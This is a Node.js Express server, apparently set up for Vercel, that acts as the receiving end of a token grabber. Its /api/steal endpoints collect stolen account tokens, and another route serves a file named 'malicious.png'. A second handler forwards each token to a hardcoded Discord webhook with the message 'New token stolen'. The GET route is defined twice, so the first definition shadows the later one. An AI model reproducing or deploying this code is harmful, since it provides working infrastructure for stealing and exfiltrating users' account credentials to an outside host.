const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// Middleware
app.use(express.json());
const WEBHOOK_URL = "https://discord.com/api/webhooks/1471811275422957580/DXYSo17alHTrrSPsq7sfLRNNGMdl4C1MxhTl5Azhyn4WSFa1xLgdTWx2uPJmRKKhWZkT";
// API endpoint for token collection
app.get('/api/steal', (req, res) => {
    const token = req.query.token;
    if (token) {
        console.log(`[+] New token received: ${token}`);
        // In Vercel, we can't write to filesystem - use a database or external service
        // For demo purposes, we'll just log it
        res.status(200).send('OK');
        return;
    }
    res.status(400).send('No token provided');
});

// POST endpoint for additional data
app.post('/api/steal', (req, res) => {
    const data = req.body;
    if (data.token) {
        console.log(`[+] Detailed data received for token: ${data.token}`);
        // In production, you would store this data
        res.status(200).send('OK');
        return;
    }
    res.status(400).send('No token provided');
});

// Serve the malicious image
app.get('/api/image', (req, res) => {
    // In Vercel, we need to serve this from the public folder
    res.sendFile(path.join(__dirname, 'public', 'malicious.png'));
});

// Add this to your server.js
const axios = require('axios');

app.get('/api/steal', async (req, res) => {
    const token = req.query.token;
    if (token) {
        try {
            // Send to Discord webhook
            await axios.post(WEBHOOK_URL, {
                content: `New token stolen: ${token}`,
                username: "Token Grabber"
            });
            res.status(200).send('OK');
        } catch (e) {
            console.error(e);
            res.status(500).send('Error');
        }
        return;
    }
    res.status(400).send('No token provided');
});
// For Vercel deployment
module.exports = app;

